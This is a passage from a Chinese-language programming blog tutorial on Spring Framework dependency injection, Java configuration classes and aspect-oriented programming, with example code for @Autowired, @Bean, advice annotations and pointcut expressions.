<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserComtroller</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>工作过程：</strong></p>
<p>首先根据所需要的组件类型到 IOC 容器中查找</p>
<ul>
<li><code>找到唯一的 bean</code>：直接执行装配</li>
<li><code>找不到匹配这个类型的 bean</code>：装配失败</li>
<li><code>所需类型匹配的 bean 不止一个</code>：装配失败</li>
<li>没有 @Qualifier 注解：根据 @Autowired 标记位置成员变量的变量名作为bean 的 id 进行匹配<ul>
<li>能够找到：执行装配</li>
<li>找不到：装配失败</li>
</ul>
</li>
<li>使用 @Qualifier 注解：根据 @Qualifier 注解中指定的名称作为 bean 的id进行匹配<ul>
<li>能够找到：执行装配</li>
<li>找不到：装配失败</li>
</ul>
</li>
</ul>
<h5 id="Resource-name-“id”-自动装配"><a href="#Resource-name-“id”-自动装配" class="headerlink" title="@Resource(name &#x3D; “id”)自动装配"></a>@Resource(name &#x3D; “id”)自动装配</h5><p><code> @Resource(name = &quot;id&quot;) 相当于 @Autowired(required - true) + @Qualified(value = &quot;id&quot;)</code></p>
<p>必须导入依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>jakarta.annotation<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jakarta.annotation-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Resource(name = &quot;userService&quot;)</span></span><br><span class="line"><span class="keyword">private</span> UserService userSer;</span><br></pre></td></tr></table></figure>

<p>注意！@Resource注解有两个实现，必须导入<code>jalarta.annotation</code>包的</p>
<h4 id="基本数据类型注入"><a href="#基本数据类型注入" class="headerlink" title="基本数据类型注入"></a>基本数据类型注入</h4><p>方法1：直接在代码中赋值</p>
<p>方法2：@Value()注解赋值</p>
<p>方法3：@Value(“${配置文件属性项}”)注解读取配置文件赋值，可以设置默认值</p>
<blockquote>
<p>需要：XML配置文件中使用&lt;context:property-placeholder location&#x3D;”classpath:name.properties”&#x2F;&gt;导入了配置文件</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方法1 代码直接赋值</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法2 Value注解赋值</span></span><br><span class="line"><span class="meta">@Value(&quot;Tom&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String Name;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法3 Value注解读取配置文件赋值</span></span><br><span class="line"><span class="meta">@Value(&quot;$&#123;user.Address&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String Address;</span><br><span class="line"><span class="meta">@Value(&quot;$&#123;user.Job:Dancer&#125;&quot;)</span></span><br><span class="line"><span class="comment">// 若配置文件中没有配置user.Job项，则使用默认值Dancer</span></span><br><span class="line"><span class="keyword">private</span> String Job;</span><br></pre></td></tr></table></figure>





<hr>
<h2 id="基于配置类-注解的完全注解组件管理配置方式"><a href="#基于配置类-注解的完全注解组件管理配置方式" class="headerlink" title="基于配置类+注解的完全注解组件管理配置方式"></a>基于配置类+注解的完全注解组件管理配置方式</h2><p>配置类可以完全替代XML配置文件，实现：</p>
<ol>
<li>包注解扫描配置</li>
<li>引用外部配置文件</li>
<li>声明第三方依赖的bean组件</li>
</ol>
<p><strong>需要注意的是，配置类只是替代XML配置文件，并不能替代上述基于注解的组件管理配置方式，自定义类的bean组件仍然按之前的方法说明和实现依赖注入。</strong></p>
<hr>
<h3 id="配置类的创建步骤"><a href="#配置类的创建步骤" class="headerlink" title="配置类的创建步骤"></a><strong>配置类的创建步骤</strong></h3><p>步骤1：添加<code>@Configuration注</code>解，代表当前类是配置类</p>
<p>步骤2：添加实现上述三个功能的对应注解</p>
<ol>
<li><code>@ComponentScan(&quot;待扫描注解的包&quot;)</code>：包注解扫描配置，多个配置文件可以使用<code>,</code>分隔。配置类无需扫描。</li>
<li><code>@PropertySource(value=&quot;path&quot;)</code>：引用外部配置文件，多个配置文件可以使用<code>,</code>分隔。</li>
<li><code>@Bean</code>：声明第三方依赖的bean组件。<strong>每声明一个</strong>第三方依赖的bean<strong>组件都需要创建一个public方法</strong>。<ul>
<li>方法返回值类型：bean组件的类型或其接口或其父类，即组件的 <code>class</code></li>
<li>方法名：bean组件名称，即组件的 <code>id</code> </li>
<li>方法体：自定义实现过程，一般通过<code>set</code>方法实现DI依赖注入。</li>
</ul>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ComponentScan(&quot;com.learn&quot;)</span></span><br><span class="line"><span class="meta">@PropertySource(value = &quot;classpath:jdbc.properties&quot;)</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConfigurationNote1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> DruidDataSource <span class="title function_">druidDataSource</span><span class="params">(</span></span><br><span class="line"><span class="params">            // 从外部配置文件引入配置</span></span><br><span class="line"><span class="params">            // 如果这是此组件使用，放置在方法的形参列表</span></span><br><span class="line"><span class="params">            // 如果多个组件使用，建议设置为成员变量</span></span><br><span class="line"><span class="params">            <span class="meta">@Value(&quot;$&#123;url&#125;&quot;)</span> String url,</span></span><br><span class="line"><span class="params">            <span class="meta">@Value(&quot;$&#123;username&#125;&quot;)</span> String userName,</span></span><br><span class="line"><span class="params">            <span class="meta">@Value(&quot;$&#123;driverClassName&#125;&quot;)</span> String driverClassName,</span></span><br><span class="line"><span class="params">            <span class="meta">@Value(&quot;$&#123;password&#125;&quot;)</span> String password</span></span><br><span class="line"><span class="params">    )</span>&#123;</span><br><span class="line">        <span class="type">DruidDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidDataSource</span>();</span><br><span class="line">        dataSource.setUrl(url);</span><br><span class="line">        dataSource.setUsername(userName);</span><br><span class="line">        dataSource.setDriverClassName(driverClassName);</span><br><span class="line">        dataSource.setPassword(password);</span><br><span class="line">        <span class="keyword">return</span> dataSource;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<hr>
<h3 id="使用配置类创建IoC容器并获取组件"><a href="#使用配置类创建IoC容器并获取组件" class="headerlink" title="使用配置类创建IoC容器并获取组件"></a>使用配置类创建IoC容器并获取组件</h3><p>与XML配置文件方式（使用<code>ClassPathXmlApplicationContext</code>类）不同，通过配置类创建IoC需要使用<code>AnnotationConfigApplicationContext</code>类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建IoC容器的两种方法</span></span><br><span class="line">    <span class="comment">// 方法1</span></span><br><span class="line">    <span class="type">AnnotationConfigApplicationContext</span> <span class="variable">context</span></span><br><span class="line">            <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(ConfigurationNote1.class);</span><br><span class="line">    <span class="comment">// 可以设置多个配置类</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法2</span></span><br><span class="line">    <span class="type">AnnotationConfigApplicationContext</span> <span class="variable">context1</span></span><br><span class="line">            <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>();</span><br><span class="line">    context1.register(ConfigurationNote1.class);</span><br><span class="line">    context1.refresh();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 获取bean 与之前相同。</span></span><br><span class="line">    <span class="type">StudentController</span> <span class="variable">bean</span> <span class="operator">=</span> context.getBean(StudentController.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<h3 id="附加说明：名称、周期方法、作用域、-import"><a href="#附加说明：名称、周期方法、作用域、-import" class="headerlink" title="附加说明：名称、周期方法、作用域、@import"></a>附加说明：名称、周期方法、作用域、@import</h3><p><strong>说明1：bean组件的名称</strong></p>
<p>默认情况下，组件的名称（id）即为方法名。</p>
<p>也可以通过<code>@Bean(name = &quot;&quot;)</code>或<code>@Bean(value = &quot;&quot;)</code>指定</p>
<p><strong>说明2：周期方法如何指定</strong></p>
<p>可以按原有注解方案（<code>@PostConstruct</code>、<code>@PreDestroy</code>）指定。</p>
<p>也可以通过<code>@Bean(initMethod = &quot;&quot;)</code>和<code>@Bean(destroyMethod = &quot;&quot;)</code>指定</p>
<p><strong>说明3：作用域如何指定</strong></p>
<p>按原有注解方案（<code>@Scope(scopeName = ConfigurableBeanFactory.SCOPE_PROTOTYPE) </code>）指定。</p>
<p><strong>说明4：如何引用IoC的其他组件</strong></p>
<p>被引用的组件必须放到IoC容器了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方案1（推荐） 在形参列表中声明所有需要的组件及其类型</span></span><br><span class="line"><span class="comment">// 如果被使用的同类型组件有多个，形参名即被使用的组件名（id）</span></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> JdbcTemplate <span class="title function_">jdbcTemplate1</span><span class="params">(DataSource dataSource)</span>&#123;</span><br><span class="line">    <span class="type">JdbcTemplate</span> <span class="variable">jdbcTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcTemplate</span>();</span><br><span class="line">    jdbcTemplate.setDataSource(dataSource);</span><br><span class="line">    <span class="keyword">return</span> jdbcTemplate;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 方案2 被使用的组件也是@Bean方法说明的且是无形参的，可以直接调用</span></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> JdbcTemplate <span class="title function_">jdbcTemplate</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">JdbcTemplate</span> <span class="variable">jdbcTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcTemplate</span>();</span><br><span class="line">    jdbcTemplate.setDataSource(druidDataSource());</span><br><span class="line">    <span class="keyword">return</span> jdbcTemplate;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>说明5：多个配置类如何整合为一个</strong></p>
<p>使用<code>@import(value = &#123;配置类名.class,配置类名.class&#125;)</code>整合到一个。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Import(value = &#123;ConfigurationNote11.class, ConfigurationNote12.class&#125;)</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConfigurationNote1</span> &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<hr>
<h1 id="AOP面向切面编程"><a href="#AOP面向切面编程" class="headerlink" title="AOP面向切面编程"></a>AOP面向切面编程</h1><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241221195755.png"></p>
<h2 id="AOP思想介绍"><a href="#AOP思想介绍" class="headerlink" title="AOP思想介绍"></a>AOP思想介绍</h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>假如需要设计一个计算器程序，每次计算需要输出执行运算的数和结果，对于+，—等运算，它们输出部分的功能和代码是一样的。以业务场景为例，数据库操作时，开启事务和结束事务的操作也是一样的，如果每次都编写这些代码，会大大增加重复劳动。这些附加功能代码不仅对核心业务功能有干扰，导致程序员在开发核心业务功能时分散了精力，而且重复分散在各个业务功能方法中，冗余而不方便统一维护。<strong>因此</strong>，我们需要将代码解耦，把附加功能从业务功能代码中抽取出来。将重复的代码统一提取，并且<code>动态插入</code>到每个业务方法！目前我们可以实现提取重复附加功能代码到一个类中，但是如何将代码插入到各个方法中呢？这就需要引入代理模式这个设计思想。</p>
<h3 id="解决方案-代理模式"><a href="#解决方案-代理模式" class="headerlink" title="解决方案 - 代理模式"></a>解决方案 - 代理模式</h3><p>二十三种设计模式中的一种，属于<code>结构型模式</code>。它的作用就是通过提供一个代理类，让我们在调用目标方法的时候，不再是直接对目标方法进行调用，而是通过代理类间接调用。让不属于目标方法核心逻辑的代码从目标方法中剥离出来——解耦。调用目标方法时先调用代理对象的方法，减少对目标方法的调用和打扰，同时让附加功能能够集中在一起也有利于统一维护。如下图所示，当外部代码需要调用目标方法时，通过代理类调用，而不是总结调用，相当于套了一层。</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241221182630.png"></p>
<p>代理模式有两种实现方式：<code>静态代理</code>和<code>动态代理</code>。</p>
<p>静态代理在编译时就已经确定了代理类和被代理类的关系。静态代理中，代理类和被代理类都实现了相同的接口，或者代理类继承了被代理类。代理类持有对被代理类的引用，并且可以在调用被代理类的方法前后添加额外的功能。这种方式不够灵活，每一个目标方法都必须有一个固定的代理，这样当我们今后增加目标方法时也必须重新编写其对应的代理，导致了大量重复代码，增加了维护成本。</p>
<h3 id="动态代理模式"><a href="#动态代理模式" class="headerlink" title="动态代理模式"></a>动态代理模式</h3><p>动态代理（Dynamic Proxy）模式是在运行时创建代理类和对象，而不是在编译时就确定。动态代理可以在不修改目标对象代码的情况下为对象添加额外的行为，并且可以为多个接口创建代理，而不需要像静态代理那样为每个接口都编写一个具体的代理类。这使得它非常适合用于AOP（面向切面编程）、事务管理、权限检查等场景。</p>
<p>Java有两种主要的动态代理实现技术，没有实现接口的目标类只能通过Spring-CGLIB实现动态代理：</p>
<ul>
<li><code>JDK动态代理：</code>JDK提供了内置的支持来实现动态代理，主要通过 <code>java.lang.reflect.Proxy</code> 类和 <code>java.lang.reflect.InvocationHandler</code> 接口。需要被代理的目标类必须实现接口，JDK会根据目标类的接口动态生成一个代理对象。代理对象和目标对象有相同的接口。</li>
<li><code>Spring-Cglib</code>：通过继承被代理的目标类实现代理，不需要目标类实现接口。</li>
</ul>
<p>JDK实现动态代理十分复杂，Spring框架集成了Cglib，使用Spring框架中的可以大大简化，无需编写代理代码，直接配置即可。</p>
<h3 id="AOP面向切面编程-1"><a href="#AOP面向切面编程-1" class="headerlink" title="AOP面向切面编程"></a>AOP面向切面编程</h3><p><code>AOP：Aspect Oriented Programming面向切面编程</code>。AOP可以说是OOP（Object Oriented Programming，面向对象编程）的补充和完善。OOP引入封装、继承、多态等概念来建立一种对象层次结构，用于模拟公共行为的一个集合。不过OOP允许开发者定义纵向的关系，但并不适合定义横向的关系，例如日志功能。日志代码往往横向地散布在所有对象层次中，而与它对应的对象的核心功能毫无关系对于其他类型的代码，如安全性、异常处理和透明的持续性也都是如此，这种散布在各处的无关的代码被称为横切（cross cutting），在OOP设计中，它导致了大量代码的重复，而不利于各个模块的重用。在<code>OOP</code>下，子类可以完全使用父类的方法（继承）或是完全重新定义父类的方法（重写），但无法对父类的方法做出局部 的更改。AOP技术恰恰相反，它利用一种称为”横切”的技术，剖解开封装的对象内部，并将那些影响了多个类的公共行为封装到一个可重用模块，并将其命名为”Aspect”，即切面。所谓”切面”，简单说就是那些与业务无关，却为业务模块所共同调用的逻辑或责任封装起来，便于减少系统的重复代码，降低模块之间的耦合度，并有利于未来的可操作性和可维护性。使用AOP，可以在不修改原来代码的基础上添加新功能。</p>
<h4 id="AOP应用场景"><a href="#AOP应用场景" class="headerlink" title="AOP应用场景"></a>AOP应用场景</h4><p>AOP（面向切面编程）是一种编程范式，它通过将通用的横切关注点（如日志、事务、权限控制等）与业务逻辑分离，使得代码更加清晰、简洁、易于维护。AOP可以应用于各种场景，以下是一些常见的AOP应用场景：</p>
<ol>
<li>日志记录：在系统中记录日志是非常重要的，可以使用AOP来实现日志记录的功能，可以在方法执行前、执行后或异常抛出时记录日志。</li>
<li>事务处理：在数据库操作中使用事务可以保证数据的一致性，可以使用AOP来实现事务处理的功能，可以在方法开始前开启事务，在方法执行完毕后提交或回滚事务。</li>
<li>安全控制：在系统中包含某些需要安全控制的操作，如登录、修改密码、授权等，可以使用AOP来实现安全控制的功能。可以在方法执行前进行权限判断，如果用户没有权限，则抛出异常或转向到错误页面，以防止未经授权的访问。</li>
<li>性能监控：在系统运行过程中，有时需要对某些方法的性能进行监控，以找到系统的瓶颈并进行优化。可以使用AOP来实现性能监控的功能，可以在方法执行前记录时间戳，在方法执行完毕后计算方法执行时间并输出到日志中。</li>
<li>异常处理：系统中可能出现各种异常情况，如空指针异常、数据库连接异常等，可以使用AOP来实现异常处理的功能，在方法执行过程中，如果出现异常，则进行异常处理（如记录日志、发送邮件等）。</li>
<li>缓存控制：在系统中有些数据可以缓存起来以提高访问速度，可以使用AOP来实现缓存控制的功能，可以在方法执行前查询缓存中是否有数据，如果有则返回，否则执行方法并将方法返回值存入缓存中。</li>
<li>动态代理：AOP的实现方式之一是通过动态代理，可以代理某个类的所有方法，用于实现各种功能。 综上所述，</li>
</ol>
<p><strong>AOP主要就是用于解决非核心业务代码的冗余问题，只要代码中有一部分代码在不同代码中多次出现，就可以使用AOP思想简化。</strong></p>
<h4 id="AOP的八个专业术语"><a href="#AOP的八个专业术语" class="headerlink" title="AOP的八个专业术语"></a>AOP的八个专业术语</h4><p><strong>1-横切关注点</strong></p>
<p>从每个方法中抽取出来的同一类非核心业务。在同一个项目中，我们可以使用多个横切关注点对相关方法进行多个不同方面的增强。这个概念不是语法层面天然存在的，而是根据附加功能的逻辑上的需要：有十个附加功能，就有十个横切关注点。</p>
<p>AOP把软件系统分为两个部分：核心关注点和横切关注点。业务处理的主要流程是核心关注点，与之关系不大的部分是横切关注点。横切关注点的一个特点是，他们经常发生在核心关注点的多处，而各处基本相似，比如权限认证、日志、事务、异常等。AOP的作用在于分离系统中的各种关注点，将核心关注点和横切关注点分离开来。</p>
<p><strong>2-通知(增强)</strong></p>
<p>每一个横切关注点上要做的事情都需要写一个方法来实现（即提取出的代码形成的方法），这样的方法就叫<code>通知方法</code>。</p>
<ul>
<li>前置通知：在被代理的目标方法<code>前</code>执行</li>
<li>返回通知：在被代理的目标方法<code>成功结束</code>后执行（寿终正寝）</li>
<li>异常通知：在被代理的目标方法<code>异常结束</code>后执行（死于非命）</li>
<li>后置通知：在被代理的目标方法<code>最终结束</code>后执行（盖棺定论）无论成功还是异常结束</li>
<li>环绕通知：使用try…catch…finally结构围绕整个被代理的目标方法，包括上面四种通知对应的所有位置</li>
</ul>
<p><strong>3-连接点 joinpoint</strong></p>
<p>这也是一个纯逻辑概念，不是语法定义的。指那些被拦截到的点。在 Spring 中，可以被动态代理拦截目标类的方法</p>
<p><strong>4-切入点 pointcut</strong></p>
<p>定位连接点的方式，或者可以理解成被选中的连接点！是一个表达式，比如execution(* com.spring.service.impl..(..))。符合条件的每个方法都是一个具体的连接点</p>
<p><strong>5-切面 aspect</strong></p>
<p>切入点和通知的结合。是一个类</p>
<p><strong>6-目标 target</strong></p>
<p>被代理的目标对象。</p>
<hr>
<p><strong>7-代理 proxy</strong></p>
<p>向目标对象应用通知之后创建的代理对象。</p>
<p><strong>8-织入 weave</strong></p>
<p>指把通知应用到目标上，生成代理对象的过程。可以在编译期织入，也可以在运行期织入，Spring采用后者。</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250315203853.png"></p>
<h2 id="Spring-AOP-技术框架"><a href="#Spring-AOP-技术框架" class="headerlink" title="Spring AOP(技术框架)"></a>Spring AOP(技术框架)</h2><p>Spring AOP底层技术：</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241221200248.png"></p>
<p><strong>在目标方法类有接口的情况下，Spring框架自动使用jdk方式构建AOP，没有接口时自动使用CGLIB</strong></p>
<h3 id="基于注解方式实现AOP"><a href="#基于注解方式实现AOP" class="headerlink" title="基于注解方式实现AOP"></a>基于注解方式实现AOP</h3><h4 id="基本配置流程"><a href="#基本配置流程" class="headerlink" title="基本配置流程"></a>基本配置流程</h4><p>具体流程可以参考 【实践 - 实践4】，这里仅记录理论知识。 </p>
<ol>
<li>导入依赖</li>
<li>正常编写核心业务，加入IoC容器</li>
<li>编写IoC配置类和文件</li>
<li>测试环境</li>
<li>增强类，定义增强方法（存储横切关注点的代码）</li>
<li>增强类的配置（插入切点的位置，切点指定，切面配置等）</li>
<li>开启AOP的配置</li>
</ol>
<p><strong>导入依赖spring-aspects</strong></p>
<p>此依赖集成了实现AOP的所有需要的依赖。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aspects<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h5 id="注解及其功能"><a href="#注解及其功能" class="headerlink" title="注解及其功能"></a>注解及其功能</h5><p>增强类需要<code>@Aspect</code>注解说明，也需要放入IoC容器，因此还需要<code>@Component</code></p>
<p>配置类需要<code>@EnableAspectJAutoProxy</code>注解说明开启AOP;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//    try&#123;                                               ——|</span></span><br><span class="line"><span class="comment">//        前置通知；@Before(value =&quot;切点表达式&quot;)               |</span></span><br><span class="line">          核心代码；                                         |</span><br><span class="line"><span class="comment">//        后置通知；@AfterReturning(value =&quot;切点表达式&quot;)       |</span></span><br><span class="line"><span class="comment">//    &#125;catch()&#123;                                             &gt; 环绕通知；@Around(value =&quot;切点表达式&quot;)</span></span><br><span class="line"><span class="comment">//        异常通知；@AfterThrowing(value =&quot;切点表达式&quot;)        |</span></span><br><span class="line"><span class="comment">//    &#125;finally&#123;                                             |</span></span><br><span class="line"><span class="comment">//        最后通知；@After(value =&quot;切点表达式&quot;)                |</span></span><br><span class="line"><span class="comment">//    &#125;                                                   ——|</span></span><br></pre></td></tr></table></figure>



<h4 id="获取目标方法信息"><a href="#获取目标方法信息" class="headerlink" title="获取目标方法信息"></a>获取目标方法信息</h4><p><strong>获取目标方法的信息</strong>，在增强方法的声明中添加<code>JointPoint</code>类（<code>org.aspectj.lang.JoinPoint</code>包下的）形参：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Before(&quot;execution(* com.fu.service.imp.*.*(..))&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(JoinPoint joinPoint)</span>&#123;</span><br><span class="line">    <span class="comment">// 获取目标方法所属类的信息</span></span><br><span class="line">    <span class="comment">// 类名</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> joinPoint.getTarget().getClass().getSimpleName();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取目标方法的信息</span></span><br><span class="line">    <span class="comment">// 方法名</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">funcName</span> <span class="operator">=</span> joinPoint.getSignature().getName();</span><br><span class="line">    <span class="comment">// 修饰符</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">modifiers</span> <span class="operator">=</span> joinPoint.getSignature().getModifiers();</span><br><span class="line">    <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> Modifier.toString(modifiers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取目标方法参数列表</span></span><br><span class="line">    Object[] args = joinPoint.getArgs();</span><br><span class="line">    System.out.println(className + <span class="string">&quot; &quot;</span> + string + <span class="string">&quot; &quot;</span> + funcName + <span class="string">&quot; function start&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>获取目标方法的返回值</strong>，需要在增强方法中添加<code>Object</code>类的形参，并修改注解，增加<code>returning</code>属性：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@AfterReturning(value = &quot;execution(* com.fu.service.imp.*.*(..))&quot;,returning = &quot;result&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">success</span><span class="params">(Object result)</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;function success and result is &quot;</span>+ result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>获取目标方法执行的异常</strong>，需要在增强方法中添加<code>Throwable</code>类的形参，并修改注解，增加<code>throwing</code>属性：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@AfterThrowing(value = &quot;execution(* com.fu.service.imp.*.*(..))&quot;,throwing = &quot;t&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">error</span><span class="params">(Throwable t)</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;function error&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<h4 id="切点表达式语法"><a href="#切点表达式语法" class="headerlink" title="切点表达式语法"></a>切点表达式语法</h4><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241221232640.png"></p>
<p>固定语法：<code>execution(1 2 3.4.5(6))</code>：基本按正则表达式</p>
<ol>
<li><p>访问修饰符</p>
</li>
<li><p>方法的返回参数类型</p>
<blockquote>
<p>如果不考虑访问修饰符和方法的返回参数类型，可以使用一个 <code>*</code> 符号代替上述二者。</p>
<p>如果不考虑访问修饰符或方法的返回参数类型，就必须两者一起忽略；</p>
<p>如果考虑访问修饰符或方法的返回参数类型，就必须都考虑，都填写。</p>
</blockquote>
</li>
<li><p>包的位置</p>
<ul>
<li><p>具体包的位置，如：<code>com.fu.service.imp</code></p>
</li>
<li><p>单层模糊匹配，使用一个<code>*</code>，如：<code>com.fu.service.*</code></p>
</li>
<li><p>任意层模糊匹配，使用<code>..</code>，但不能以此开头，如：<code>com..imp</code>。</p>
<blockquote>
<p>匹配所有包下的Imp包：*..imp</p>
</blockquote>
</li>
</ul>
</li>
<li><p>类的名称</p>
<ul>
<li>可以填写具体类，如：<code>CalculatorPureImp</code></li>
<li>可以全部模糊，即匹配包下所有类，使用一个<code>*</code>。</li>
<li>可以部分模糊，按正则表达式，如：<code>*imp</code>。</li>
</ul>
</li>
<li><p>方法名，语法与类名一致。</p>
</li>
<li><p>参数列表：</p>
<ul>
<li>无参：<code>()</code></li>
<li>有具体参，参数必须按照填写顺序，如：<code>(String)</code>，只有一个String参数</li>
<li>模糊参数，有没有，有几个参数均可以：<code>(..)</code></li>
<li>部分模糊参数，如：第一个参数是int，其后是否存在参数，有哪些参数均无所谓，使用<code>(int..)</code></li>
</ul>
</li>
</ol>
<h5 id="切点表达式提取"><a href="#切点表达式提取" class="headerlink" title="切点表达式提取"></a>切点表达式提取</h5><p>为了避免后续修改时需要修改大量切点表达式，我们可以将切点表达式提取出来并复用：</p>
<p><strong>方法1：当前类提取</strong></p>
<p>在切点表达式所在的增强类中定义一个空方法，添加注解<code>@Pointcut(value = &quot;提取的切点表达式&quot;)</code>，然后修改其他使用切点表达式的增强方法，将切点表达式改为调用空方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Pointcut(&quot;execution(* com.fu.service.imp.*.*(..))&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pc</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Before(&quot;pc()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(JoinPoint joinPoint)</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;function start&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@AfterReturning(&quot;pc()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">success</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;function success&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>方法2：创建一个切点存储类</strong>，单独维护切点表达式，其他增强类通过<code>类的全限定符.方法名</code>调用。这个类也需要放到IoC容器。</p>
<p>创建切点存储类：</p>
